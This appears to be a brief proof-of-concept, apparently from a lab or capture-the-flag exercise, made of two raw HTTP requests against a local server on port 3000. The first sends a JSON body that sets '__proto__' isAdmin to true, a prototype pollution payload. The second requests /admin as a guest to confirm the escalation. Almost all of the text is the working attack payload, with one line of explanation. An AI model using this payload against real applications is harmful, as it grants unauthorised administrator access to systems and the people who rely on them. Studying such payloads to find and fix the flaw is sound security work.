First:

POST /update-profile HTTP/1.1
Host: localhost:3000
Cookie: username=guest
Content-Type: application/json
Content-Length: 42

{
    "__proto__": { "isAdmin": true }
}

Then: 

GET /admin HTTP/1.1
Cookie: username=guest
Host: localhost:3000


[must have 2 blank lines in the end]

This will show that we're an admin now.
